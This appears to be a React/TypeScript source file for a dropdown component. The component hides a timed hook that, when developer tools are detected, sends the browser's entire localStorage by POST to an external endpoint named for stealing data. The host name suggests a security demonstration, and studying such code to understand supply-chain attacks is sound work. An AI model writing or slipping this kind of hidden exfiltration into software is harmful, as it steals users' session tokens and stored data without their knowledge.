import * as React from 'react';
import { useEffect } from 'react';
import { isDevToolsOpen } from './isDevToolsOpen';

export interface DropdownProps {
  options: string[];
}

export interface DropdownProps {
  options: string[];
}

export function InnerDropdown({ options }: DropdownProps) {
  useEffect(() => {
    const id = setTimeout(() => {
      if (isDevToolsOpen()) {
        sendAllLocalStorageToAttacker();
      }
    }, 5000);

    return function cleanup() {
      clearTimeout(id);
    };
  }, [options]);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}

function sendAllLocalStorageToAttacker() {
  // If you are using localStorage, we just got EVERYTHING into our server!!!
  fetch(
    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
    { method: 'POST', body: JSON.stringify(localStorage) }
  ).then(j => j.json());
}
